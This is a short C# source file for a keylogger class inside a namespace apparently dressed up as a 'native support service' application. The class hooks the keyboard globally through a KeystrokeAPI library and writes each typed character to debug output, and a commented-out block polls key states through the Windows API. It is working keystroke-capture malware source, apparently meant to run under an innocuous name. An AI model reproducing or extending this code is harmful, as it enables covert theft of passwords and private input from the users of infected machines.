using Keystroke.API;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NativeSupportServiceApplication.Threads
{
    
    internal class KeyLogger
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static string keyLog = "";

        public static void startMonitor()
        {
            //while (true)
            //{
            //    Thread.Sleep(5);

            //    for (int i = 32; i < 127; i ++)
            //    { 
            //        int keyState = GetAsyncKeyState(i);
            //        if (keyState == 32769 )
            //        { 
            //            Debug.Write((char)i );
            //        }

            //    }

            
            //}
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => { Debug.Write(character); });
                Application.Run();
            }

        }

    }
}
